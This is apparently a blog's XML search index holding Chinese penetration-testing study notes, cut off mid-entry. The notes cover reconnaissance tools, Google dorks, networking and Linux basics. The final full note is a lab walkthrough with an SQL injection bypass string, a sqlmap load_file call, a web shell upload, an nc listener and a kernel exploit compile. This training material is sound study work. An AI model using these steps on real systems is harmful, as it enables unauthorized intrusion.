<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[渗透测试学习笔记07-信息收集]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B007-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[信息收集 域名信息 整站分析 敏感目录 谷歌 hacker 端口扫描 URL采集 旁站C段 信息分析 域名信息 对应IP收集 相关域名对应IP,相关工具:nslookup,一些工具网站 子域名收集 工具:layer,subDomainBrute whois(注册人)信息查询 根据已知域名反查,分析出此域名的注册人,邮箱,电话等. 工具:爱站网,站长工具,微步在线(https://x.threatbook.cn) site.ip138.com,searchdns.netcraft.com 敏感目录 收集方向 robots.txt,后台目录,安装包,上传目录,mysql管理接口,安装页面, phpinfo,编辑器,iis短文件 常用工具 字典爆破-&gt;御剑,dirbuster,wwwscan,IIS_shortname_Scanner等 蜘蛛爬行-&gt;爬行菜刀,webrobot,burp等 端口扫描 nmap,portscan,ntscan,telnet 21-&gt;FTP 22-&gt;SSH 23-&gt;Telnet 110-&gt;POP3 1433-&gt;Sqlserver 3306-&gt;Mysql 3389-&gt;Mstsc 8080-&gt;Tomcat/jboss 9090-&gt;WebSphere等 旁站C段 旁站:同服务器其他站点 C段:同一网段其他服务器 常用工具: web-&gt;K8旁站,御剑1.5 端口-&gt;portscan 整站分析 服务器类型 服务器平台,版本等 网站容器 搭建网站的服务组件,reg:iis,Apache,nginx,tomcat 脚本类型 ASP,PHP,JSP,aspx等 数据库类型 access,sqlserver,mysql,oracle,postgresql等 CMS类型 WAF 谷歌hacker 1.Intext 查找网页中含有xx关键字的网站 reg:Intext:管理员登录 2.Intitle 查找某个标题 reg:intitle:后台登录 3.Filetype 查找某个文件类型的文件 reg:数据挖掘filetype:doc 4.Inurl 查找url中带有某字段的网站 reg:inurl:php?id= 5.Site 在某域名中查找信息 URL采集 采集相关url的同类网站 例如: php?id= 漏洞网站 相同某种指纹网站 常用工具 谷歌hacker url采集器 后台查找 1.弱口令默认后台:admin,admin/login.asp,manage,login.asp等等 常见的后台 2.查看网页的链接:一般来说,网站的主页有管理登陆类似的东西,有些可能被管理员删掉 3.查看网站图片的属性 4.查看网站使用的管理系统,从而确定后台 5.用工具查找:wwwscan,intellitamaper,御剑 6.robots.txt的帮助:robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看 7.GoogleHacker 8.查看网站使用的编辑器是否有默认后台 9.短文件利用 10.sqlmap-sql-shell load_file(&apos;d:/wwroot/index.php&apos;); CDN绕过方法 什么是CDN 如何判断网站有没有使用CDN(超级ping) 1.查找二级域名 2.让服务器主动给你发包(邮件) 3.敏感文件泄露 5.查询历史解析ip 访问绕过cdn 修改hosts文件]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(9)-工具网站与万能秘钥]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-9-%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99%E4%B8%8E%E4%B8%87%E8%83%BD%E7%A7%98%E9%92%A5%2F</url>
    <content type="text"><![CDATA[工具网站: www.exploit-db.com www.sebug.net Acunetix Web Vulnerability Scanner IBM Security AppScan Nessus Metasploit 利用互联网收集信息 1.&quot;Google hack&quot; site:www.nsfocus.com inurl:admin filetype:action 2.万能的&quot;站长工具&quot; tool.chinaz.com 3.自己的双手也很神奇 查找关键字 Power by DEDECMS 源码的注释 网站报错信息 网站版本页面 robot.txt 敏感目录 ... 万能秘钥: 用户名:&apos;or&apos;=&apos;or&apos; 密码:&apos;or&apos;=&apos;or&apos; 一般用于ASP]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(8)-信息收集-爬虫-md5-nmap]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%88%AC%E8%99%AB-md5-nmap%2F</url>
    <content type="text"><![CDATA[信息搜集-目录结构分析 1.信息收集 2.整站目录结构,数据库调用原理 3.批量拿站讲解 信息搜集: dns收集 敏感目录 端口探测 谷歌黑客 子域探测 旁站探测 C段查询 整站识别 waf探测 工具网站 常用的系统: BackTrack parrot(新出的) Kali(BT5现在版本) DNS收集 域名--ip whois查询 站长工具 http://tool.chinaz.com/ netcraft http://searchdns.netcraft.com DNS--ip查询 查询内容 查询工具 主机[A]记录 站长之家 别名[CNAME] netcraft 主机信息[HINFO] dnsenum 邮箱[MB] dnswalk 邮件交换器[MX] dig 指针记录[PTR] lbd 服务记录[SRV] # ns1.2.3.4... 表示解析DNS的服务器 # dnsenum baidu.com 搜集百度的dns和主机名 dns # dns 然后按两下Tab键 # dnsmap baidu.com # whois baidu.com whois查询 (1)根据已知域名反查,分析出此域名的注册人,邮箱,电话等字段,执行以下(2)至(5)反查方式; (2)根据已知域名WHOIS中的注册邮箱来反查得出其它域名WHOIS中注册邮箱与此相同的域名列表; (3)根据已知域名WHOIS中的注册人来反查得出其它域名WHOIS中注册人与此相同的域名列表; (4)根据已知域名WHOIS中的联系电话来反查得出其它域名WHOIS中联系电话与此相同的域名列表; (5)其它反查方式:比如可以根据注册机构,传真,地址,注册商等等方式来反查. 敏感目录收集 mysql管理接口 wwwscan 后台目录 御剑 上传目录 Cansina phpinfo burpsuit robots.txt webrobot 安装包 skipfish 安装页面 uniscan 爬行 websploit reg: http://www.qufutuan.com/robots.txt 直接注入代码查询敏感目录,这个是防止爬行的文件. reg: www.qufutuan.com/manage 御剑查找 cmd5.com --查询MD5 cmd-&gt; java.exe -jar C:\xxx.jar 爬虫需要有一个代理,在34:00时间段左右 进入websploit之后 # show modules use web/dir_scanner show options run namp核心功能: 主机发现(Host Discovery) 端口扫描(Port Scanning) 版本侦测(Version Detection) 操作系统侦测(OS detection) 防火墙/IDS规避(Firewall/IDS evasion) NSE脚本引擎(Nmap Scripting Engine) # nmap -sS xxx.xxx.xxx.xxx]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(7)-网络模型与路由器]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-7-%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%B8%8E%E8%B7%AF%E7%94%B1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[1.网络架构,以及tcp/ip协议参数 2.交换机,路由器的作用及配置 3.交换机,路由器的攻击及登陆密码的破解 网络架构 互联网组成: 小局域网,园区网,如果不上外网基本不用路由器 做数据包转发时用用到路由器或交换机 局域网-局域网之间用光纤,设备用路由器 互联网-&gt;(可以理解为)N多个园区网组成 网线100米,最佳传输不能超过75米 局域网特点和常用设备: 距离短 延迟小 传输速率高 传输可靠 HUB 交换机(目前用的较多) 路由器 光纤-&gt;猫-&gt;交换机(4口)-&gt;电脑 光纤(电话线)-&gt;猫-&gt;电脑(仅一台)-&gt;拨号 公司:光纤(电话线)-&gt;猫-&gt;交换机-&gt;电脑 -&gt;交换机-&gt;电脑 -&gt;交换机-&gt;电脑 ...... 广播风暴-&gt;就是造成环路现象-&gt;上不去网 广域网常用设备: Modem(猫) 路由器 广域网交换机(处理核心流量) 接入服务器 Internet发展历史: 1969年-&gt; 1983年-&gt; ... 1991年底-&gt; 《谢希仁,计算机网络基础,第5版》 Internet的现状 ISP:网通,电信等网络运营商 ISP ... ISP ISP ... ISP 区域性ISP 区域性ISP 国家或国家ISP ↓ NAP(海底光纤) ↓ 国家或国家ISP 网络世界的规则 网络 协议 网络 标准: 数据通信标准分为两类:事实的和法定的 事实标准:未经组织团体承认但已在应用中被广泛使用和接受的就是事实标准(de facto standard) 法定标准:由官方认可的团体制定的标准称为法定标准(de jure standard) 标准化组织: 国际标准化组织(ISO) --&gt;reg:制定的OSR7层模型 电子电器工程师协会(IEEE) 美国国家标准局(ANSI) 电子工业协会(EIA/TIA) 国际电信联盟(ITU) INTERNET工程任务委员会(IETF) 分层网络模型: Core High-Speed Switching(核心层)(核心交换机) Distribution Policy-Based Connectivity(高级交换机在这运行) Access Local and Remote Workgroup Access(最低端) 网络结构 Access 电脑-&gt;交换机 Distribution 交换机-&gt;(汇聚层)三层交换(配置策略)(A不访问B,B不访问A,等等) Core 三层交换-&gt;核心网络交换 Core用途:高速交换整个区域的流量 Core-&gt;三层交换-&gt;路由器(外网)(服务器)(网通) TCP/IP参数 OSI参考模型 OSI RM:开放系统互连参考模型(Open System Interconnection Reference Model) OSI参考模型具有以下优点 简化了相关的网络操作 提供设备间的兼容性和标准接口 促进标准化工作 结构上可以分割 易于实现和维护 OSI分层 应用层 7 表示层 6 5,6,7 叫高层:负责主机之间的数据传输 会话层 5 传输层 4 网络层 3 数据链路层 2 1,2,3,4 叫底层:负责网络数据传输 物理层 1 OSI七层功能 应用层 7 --提供应用程序间通信(应用软件) 表示层 6 --处理数据格式,数据加密等() 会话层 5 --建立,维护和管理会话(QQ等会话) 传输层 4 --建立主机端到端连接(协议) 网络层 3 --寻址和路由选择(路由器) 数据链路层 2 --提供介质访问,链路管理等(交换机) 物理层 1 --比特流传输(网线,光纤,传的reg:虚拟的是0,1) TCP/IP协议栈 OSI TCP/IP 应用层 7 应 表示层 6 用 会话层 5 层 传输层 4 传输层 网络层 3 网络层 数据链路层 2 网络 物理层 1 接口层 应用层 HTTP,Telnet,FTP,TFTP --&gt;提供应用程序网络接口 传输层 TCP/UDP --&gt;建立端到端连接 网络层 IP --&gt;寻址和路由选择 数据链路层(交换机) Ethernet,802.3,PPP --&gt;物理介质访问(只识别物理地址) 物理层 接口和线缆 --&gt;二进制数据流传输 网关:网线-&gt;(外网IP)-&gt;路由器(内网IP:192.168.1.1)-&gt;交换机-&gt;PC 192.168.1.2,网关是192.168.1.1 202.1.1.100 网关在这里就是路由器连接的内网IP 1.2去访问1.5的过程: 1.2数据包-&gt;交换机(仅识别Mac地址?) -&gt;给每个接口发送广播-&gt;1.5的接口返回广播 交换机将每个接口写成mac-zp-&gt;然后找到1.5 IP地址分为4类 类别 最大网络数 A类: 126 0.0.0.0-127.255.255.255 B类: 1638 128.0.0.0-191.255.255.255 C类: 2097152 192.0.0.0-223.255.255.255 D类: 一般不给PC用,给交换机或设备之间用 TCP/IP模型的层间通信与数据封装 HostA PDU 用户数据 应用层 TCP报头 上层数据 传输层 Segment IP报头 上层数据 网络层 Packet LLC报头 上层数据 FCS 数据链路层 Frame MAC报头 上层数据 FCS 010101001010101 物理层 Bit 数据解封装 HostB 应用层 ↑ 上层数据 传输层 ↑ 上层数据 网络层 ↑ TCP+上层数据 数据链路层 ↑ IP+TCP+上层数据 物理层 ↑ LLC报头+IP+TCP+上层数据 ↑ 010101001010101 reg: HostA QQ数据包(封装过程)-&gt;应用层(UDP格式走)-&gt; IP报头(对方IP)-&gt; LLC报头()-&gt; Mac报头(交换机)-&gt; 01010100101010-&gt; HostB MAC报头-&gt; LLC报头-&gt; IP报头-&gt; TCP报头-&gt; HostB 物理层功能: 规定介质类型,接口类型,信令类型 规范在终端系统之间激活,维护和关闭物理链路的电气,机械,流程和功能等方面的要求 物理层介质和物理层设备 物理层介质 -同轴电缆 -双绞线 -光纤 -无线电波 物理层设备 -中继器,集线器 数据链路层功能 网络层功能和设备 网络层协议 网络层地址 -------------------------------------- 1.TCP/IP协议栈 2.TCP/IP协议栈报文封装 3.案例分析 (看PPT) (看那个计算机网络基础) 路由器的介绍: 路由技术是Internet得以持续运转的关键所在. 查找网关中的路由表,然后一步一步来的 路由是指导IP报文发送的路径信息. IP路由过程 (看PPT) 路由器关键功能: 检查数据包的目的地 确定信息源 发现可能的路由 选择最佳路由 验证和维护路由信息 路由的来源-链路层发现的路由 [RTB]display ip routing-table (华为命令) [RTB]show ip ...(思科) 路由的来源-动态路由协议发现的路由 静态和动态路由 静态路由: 由网络管理员手工指定的路由 当网络拓扑发生变化时,管理员需要手工更新静态路由 动态路由: 路由器使用路由协议从其他路由器那里获悉的路由(rip协议)(思科Eigrp)(通用的,OSPF) 当网络拓扑发生变化时,路由器会自动更新路由信息. 路由协议 路由协议是路由器之间交互信息的一种语言.路由器之间通过路由协议共享网络状态和网络可达性的一些信息 . 相互通信的双方必须使用同一种语言才能交互路由信息 路由协议定义了一套路由器之间通信时使用的规则 路由协议维护路由表,提供最佳转发路径. 路由协议分类--作用范围 IGPs:RIP OSPF ISIS EGPs:BGP AS100 AS200 网通 路由协议分类--协议算法 根据协议算法分类 距离矢量路由选择协议(DIstance-Vector) 包括RIP和BGP.其中,BGP也被称为路径矢量协议(Path-Vector) 链路状态路由选择协议(Link-State) 又称为最短路径优先路由选择协议,包括OSPF和IS-IS 路由表: [Quidway] display ip routing-table Routing Tables: Destination/Mask proto pref cost Nexthop Interface 0.0.0.0/0 static 60 0 120.0.0.2 Serial0/0 目标网络, 协议 开钥值 下一跳 从哪个接口出去 0.0是任意网络 还有RIP 低,易执行 OSPF... 8.0.0.0/8(8是子网掩码) 子网掩码谁匹配的最多就走哪一行 路由优先级(Preference) 当存在多个路由来源时,具有较高优先级(数值越小表明优先级越高)的路由来源提供的路由将被激活,用于指导报文的转发. VRP缺省的路由优先级如下: 路由协议 优先级 DIRECT 0(最高) OSPF 10 IS-IS 15 STATIC 60 RIP 100 OSPF ASE 150 最长匹配原则: 查找路由表-&gt;目的地址与掩码分别做&quot;与&quot;操作-&gt;与路由表中的目的地址作比较-&gt;匹配-&gt;挑选出最长匹配项 交换机 交换机(Switch)意为&quot;开关&quot;是一种用于电(光)信号转发的网络设备.它可以为接入交换机的 任意两个网络节点提供独享的电信号通路.最常见的交换机是以太网交换机.其他常见的还有电话语音交换机,光纤交换机等. 交换机的工作模式 应用层 应用层 表示层 表示层 会话层 会话层 传输层 传输层 网络层 (二层交换机) 网络层 链路层 链路层-&gt;链路层 链路层 物理层 物理层-&gt;物理层 物理层]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(6)-linux之vi与网络协议相关命令]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-6-linux%E4%B9%8Bvi%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[vi是一个较大的unix命令,在启动的时候也有它自己的选项和参数 基本语法: vi [-options] [+[n]] [file] 常用选项有:-r , -R -r用于恢复系统突然崩溃时正在编辑的文件 -R用于以只读方式打开文件 +n用来指明进入vi后直接位于文件的第n行,如果不指定n,则位于最后一行 # cp /etc/resolv.conf ss # cat ss # vi +3 ss --光标停在第3行 # vi ss --光标停在第1行 必须用一些命令来操作 命令模式 按dd --删除本行 按D --删除从光标到行尾 按p --就粘贴回来 按i --在光标前面插入 按A --在行尾插入 按R --在行首插入 按o --在下一行插入 按O --在上一行插入 按u --返回上一步操作 按22 + dd --删除22行 -- 插入模式 按a --进入插入模式 按ESC --退回原始模式 就可以编辑了 按ESC+shift+; --进入底行模式 (输入一些字符命令进行操作) 输入q+回车 --退出模式(q+!)(强制退出) 输入wq --保存并退出 输入w --保存 文本插入: 在命令方式下使用某些命令会导致vi马上进入文本插入方式,这些命令包括:i,I,a,A,o,O等 在这种方式下用户的任何输入都被当做是文件的内容看待,并将其显示在屏幕上 a:在光标后附加文本 A:在本行行末附加文本 i:在光标前插入文本 I:在本行开始插入文本 o:在光标下插入新行 O:在光标上插入新行 搜索和替换: /string --向前搜索指定字符串,搜索时忽略大小写:set ic n --搜索指定字符串的下一个出现位置 :%s/old/new/g --全文替换字符串 :n1,n2s/old/new/g --在一定范围内替换指定字符串 按shift+: 输入set nu --显示行号 /内容+回车 --搜索&quot;内容&quot; 按n --向下搜索 ?内容 --向上搜索 按n --向上搜索 :%s/old内容/new内容/g --全文替换 :1,5s/old内容/new内容/g --1,5行替换 重复前一命令:. 取消上一命令:u 退出vi:行方式下使用q,行命令x相当于:wq命令.在命令方式下使用命令ZZ等效于:x命令 如果由于读写权限或是更新方面的问题,导致vi拒绝执行保存文件或退出vi的命令,那么可以在命令后加一个!号表示强制执行 cat命令: cat --显示出文件的全部内容 -n --给输出的所有行加上编号 cat 1 2 &gt; 3 --合并文件 将文件1和2合并到3,如cat 1 2 3...&gt;n # cat /etc/passwd root:x:0:0:root:/root:/bin/bash 用户名:x代表影子密码,密码放在其他位置:UID号0基本代表管理员:GID号(组id) :所在分组名称(家目录) /bin/bash:所使用的shell,bin下或bash下都能登录这个终端 像sbin,nologin是不能登录终端的. 密码存放位置: # cat /etc/shadow !! 代表没有密码 有密码的就MD5加密了 用which命令查看cat命令在哪一目录下 # which cat /bin/cat --普通用户都能用 # cat -n ss # date --显示日期 # date &gt; 1 --将date信息导入到1 # cat 1 # cat 1 ss # cat 1 ss &gt; 2 # cat 2 wc 统计文件中的单次数量 字节数 行数 -l 统计行数 -w 统计单词数 -c 统计字符数 wc sdxh.txt 会出现 2 4 26 2是行数 4是单词数 26是字符数 history查看历史命令 # wc -l ss 归档和压缩命令 gzip bzip2 (多个文件归成1个文件) 只针对单个文件压缩或 -9 显示高压缩比 -d 释放压缩文件 gzip 文件名 压缩文件 格式为后缀有.gz bzip2 文件名 压缩成的文件名 格式为 文件名.bz2 它相对于gzip压缩率更高 # ls -lh # gzip install.log install.log.gz (或者高压缩) # gzip -9 install.log install.log.gz # ls -lh # gzip -d install.log.gz # ls -lh # bzip2 install.log install.log.bz2 # ls -lh tar(归档命令)(释放归档文件)(没有压缩功能) 格式 tar 选项 归档文件名 源文件或目录 -c 创建归档文件 扩展名为.tar -v 输出详细信息 -f 表示使用归档文件 如 -cvf 创建归档文件 tar -cvf 4.tar 1 2 3 将文件1 2 3 打包归档为4.tar tar -xvf 4.tar --解包归档文件4.tar --xvf 解包归档文件 -x 解开归档文件 -t 列表查看包内的文件 tar -tvf 4.tar -r --追加TAR文件至归档结尾 tar -rvf 4.tar 5 --把5加入4.tar -p --解包时保留原始文件及目录的权限 -C --解包时指定释放的目录文件夹 -z --调用gzip程序,进行解压或压缩 -j 调用bzip2 程序进行压缩或解压 tar -cvzf test.tar.gz --被压缩的文件1 被压缩的文件2 创建归档压缩文件 后缀为gz tar -cvjf test.tar.bz2 被压缩的文件1 被压缩的文件2 创建归档压缩文件 后缀为bz2 tar -xvzf test.tar.gz -C /usr/src 解压释放归档到 /usr/src里面 tar -xvjf test.tar.bz2 -C /usr/src 解压释放到归档到 /usr/src里面 # tar -cvf 3.tar 1 2 ss -cvf创建一个归档 归档名为3.tar 将 1 2 ss归档到一起 (先归档再压缩) # gzip 3.tar 3.tar.gz # ll # rm -rf 1 2 ss # tar zxvf 3.tar.gz (归档的文件一般用tar解压) # ll # tar jxvf 4.tar.bz2 (用jxvf解压bz2,用zxvf解压gz) 安装,升级,卸载RPM软件包 2-1 安装或升级RPM软件 格式:rpm [选项] RPM包文件 用法:不同选项适用于不同情况 -i:安装一个新的rpm软件包 -U:升级某个rpm软件,若原本未装,则进行安装 -F:更新某个rpm软件,若原本未装,则放弃安装 卸载指定的RPM软件 格式:rpm -e 软件名 辅助选项 --force:强制安装所指定的rpm软件包 --nodeps:安装,升级或卸载软件时,忽略依赖关系 -h:以&quot;#&quot;号显示安装的进度 -v:显示安装过程中的详细信息 RPM软件包封装的,需要安装RPM # cd /media # cd VMware\ Tools/ # ls # tar zxvf VMwareTools-9-9.2-2496486.tar.gz -C /root/ # cd # ls # cd vmare-tools-distrib/ (./ --代指运行) (# ll 文件末尾要有-x,才是有权限 有权限才能添加) # ./ vmware-install.pl # chmod 644 vmware-install.pl 失去权限 # ./vmware-install.pl # chmod 755 vmware-install.pl 添加权限 -rwxr-xr-x. rwx 用户权限 r-x 分组权限 每一个权限加起来是7 rwx 421 rwxrwxrwx 777 rwxr-x--x 751 # chmod u-w vmware-install.pl u:所有者,g:组,o:其他人 -w 失去w功能 安装要装载CD # umount /dev/sr0 --先卸载一下 # mount /dev/sr0 /media # ls /media # ls /media/Packages/ # ls /media/Packages/ &gt;12 # wc -l 12 安装man软件(# rpm -ivh /media/Packages/man-1.6....rpm) # cd /media # cd Packages/ # rpm -ivh man-1.6f...rpm # man ls # rpm -e man --卸载man # clear 查看已安装软件 # rpm -qa # rpm -qa man --查看有没有安装man # rpm -qi man --查看详细信息 # rpm -ql man --查看安装目录 第二种方法: 编译安装过程 下载源代码安装包文件 源代码:1.tar.gz 2.自带安装程序 3.编译配置才能安装的 步骤1:tar解包 步骤2:./configure配置 用途:设置安装目录,安装模块等选项 步骤3:make编译 用途:生成可执行的二进制文件 步骤4:make install安装 用途:复制二进制文件到系统,配置应用环境 --测试及应用,维护软件 首选安装方法: 依赖关系的软件安装: # yum -y install firefox --安装一些软件 # vi /etc/yum.repos.d/rhel-source.repo --通过vi编辑它 区分:firefox的就可以直接安装,make的需要配置, 修改的地方: [rhel-source-beta] 底行模式: .,$d .:光标所在行 ,:到 $:最后 d:删除 [rhel-source] enabled=0-&gt;enabled=1 按r再按1 --替换 baseurl=f-&gt;按D,之后的全部删除 按a baseurl=file:///media/Server --路径 复制gpgkey里面的-&gt;/etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release wq 导入秘钥 # rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release # yum -y install firefox 必须指定位置,yum才能安装成功 apt-get --kali安装方法,需要保证联网 apt-get install xxx. dpkg dpkg -i xx dpkg -l dpkg -r xx 添加用户账号: useradd命令: 格式:useradd [选项]... 用户名 常用命令选项: -u:指定UID标记号 -d:指定宿主目录,缺省为 /home/用户名 -e:指定账号失效时间 -g:指定用户的基本组名(或UID号) -G:指定用户的附加组名(或GID号) -M:不为用户建立并初始化宿主目录 -s:指定用户的登录shell &lt;!-- # yum -y remove man --卸载 --&gt; # useradd cracer # ls /home # su - cracer --切换用户 # passwd cracer --更改密码 123 123 用户添加示例: 指定mike的基本组为mike,并加入到ftpuser组;指定主目录为/ftphome/mike;不允许mike通过本地登录服务器 [root@localhost~]# useradd -d /ftphome/mike -g mike -G ftpuser -s /sbin/nologin mike --对应的基本组,附加组必须存在 删除用户账号--userdel userdel命令: 格式:userdel [-r] 用户名 添加 -r 选项时,表示连用户的宿主目录一并删除 [root@localhost~]# useradd stu01 [root@localhost~]# ls -ld /home/stu01/ drwx-----2 stu01 stu01 4096 09-09 12:38 /home/stu01/ [root@localhost~]# userdel -r stu01 --加-r会把家目录也删除 [root@localhost~]# ls -ld /home/stu01/ ls:/home/stu01/:没有那个文件或目录 Linux系统网路配置: 查看网络接口信息--ifconfig 查看所有活动网络接口的信息 执行ifconfig命令 查看指定网络接口信息 格式:ifconfig 网络接口名 [root@localhost~]# ifconfig eth0 --eth0:代指网卡名,自己写 eth0 Link encap:Ethernet HWaddr 00:0C:29:57:8B:DO inet addr:192.168.4.11 Boast:192.168.4.255 Mask:255.255.255.0 ...... 网卡类型: 名称 类型 eth0 以太网 lo (虚拟)回环设备 ppp0 使用PPP协议打的串口设备(通常指调制解调器) tr0 令牌环(Token Ring) fddi0 光纤 查看主机名称--hostname hostname命令 查看或设置当前主机名; 格式:hostname 查看路由表条目---route route命令 查看或设置主机中路由表信息 格式:route [-n] # route -n 查看网络连接情况--netstat netstat命令 查看系统的网络连接状态,路由表,接口统计等信息 格式:netstat [选项] 常用选项: -a:显示所有活动连接 -n:以数字形式显示 -p:显示进程信息 -t:查看TCP协议相关信息 -u:查看UDP协议相关信息 -r:显示路由表信息 # netstat -anpt | grep:21 设置路由记录---route 删除路由表中的默认网关记录 格式:route del default gw IP地址 向路由表中添加默认网关记录 格式:route add default gw IP地址 添加到指定网段的路由记录 格式:route add -net 网段地址/24 gw IP地址 删除到指定网段的路由记录 格式:route del -net 网段地址 网络接口配置文件 /etc/sysconfig/network-scripts/目录下的 ifcfg-eth0:第1块以太网卡的配置文件 ifcfg-eth1:第2块以太网卡的配置文件 ... # ls /etc/sysconfig/network-scripts/ifcfg-* # ls /etc/sysconfig/network-scripts/ifcfg-eth0 DEVICE=eth0 ONBOOT=yes -- BOOTPROTO=static IPADDR=192.168.4.1 --IP NETMASK=255.255.255.0 --子网掩码 GATEWAY=192.168.4.2 --网关 静态改IP(改东西必须用vi命令) # vi /etc/sysconfig/network-scripts/ifcfg-eth0 启用,禁用网络接口配置 重启network网络服务 # service network restart 正在关闭接口 eth0: [确定] 关闭环回接口: [确定] 弹出环回接口: [确定] 弹出界面eth0: [确定] 禁用,启用网络接口 # ifdown eth0 # ifup eth0 域名解析配置文件 /etc/resolv.conf文件 用途:保存本机需要使用的DNS服务器的IP地址 # vi /etc/resolv.conf search localdomain nameserver 202.106.0.20 --DNS的IP地址 实战: linux安装apache,搭建网站,.... (需要安装5个软件包) (可以直接安装多个软件包) # yum -y install httpd php mysql mysql-server php-mysql (httpd:代表apache) (mysql-server:mysql服务器) (php-mysql:两者连接的软件) -&gt; 给网站权限 # ls /var/www/html/ 启动服务 # service httpd start # service mysqld start 设置mysql密码 # mysqladmin -uroot password 123456 登录mysql # mysql -uroot -p123456 mysql&gt; show databases mysql&gt; use mysql; mysql&gt; select * from admin; mysql&gt; show tables; mysql&gt; select * from user; 退出 mysql&gt; quit; 访问192.168.80.140 访问不到 将防火墙配置到最低,将防火墙策略清空 # iptables -F 复制测试平台-&gt;var-&gt;www-&gt;html-&gt;复制过去 [root@cracer var]# chown -R root www 改权限,递归改 apache是程序用户,安装完成之后自动添加 [root@cracer var]# chown -R apache www 复制测试平台-&gt;var-&gt;www-&gt;html-&gt;复制过去 login-&gt;admin+回车 修改数据库-&gt; jian root 123456 查找网站漏洞-&gt; http://192.168.80.138/article.php?id=5 http://192.168.80.138/article.php?id=5 and 1=1 (此测试网站已被审计改过) 手动修改成有漏洞的网站-&gt; [www]# cd html/ [html]# vi article.php 删除if(id==&apos;&apos;){};这一条 在下一个if里面找 WHERE id=&apos;&quot;.#_REQUEST[&apos;id&apos;].&quot;&apos;,#db --将&quot; &quot;删除 http://192.168.80.138/article.php?id=5 and 1=1 如果网站没有变化,则说明有漏洞 -&gt;把1改成2 测试 注入-&gt; 复制http://192.168.80.138/article.php?id=5 and 1=1 到Pangolin -&gt;将木马cc(2).php放入到网站,改名为cc.php http://192.168.80.138/cc.php 提权-&gt; 先将防火墙关闭 win_cmd-&gt;nc.exe -l -n -v -p 12666 --12666是端口 在网站木马执行命令: uname -r --查看内核版本 exp-&gt;linux-&gt;3.2-&gt;2.6.32.c复制 或者直接在网站木马上传 上面输入/tmp/,选择文件,上传 win-&gt; cd tmp gcc 2.6.32.c 找a.out (xxx.out文件) -&gt;执行a.out a.out]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(5)-linux常用命令及目录结构]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-5-linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%2F</url>
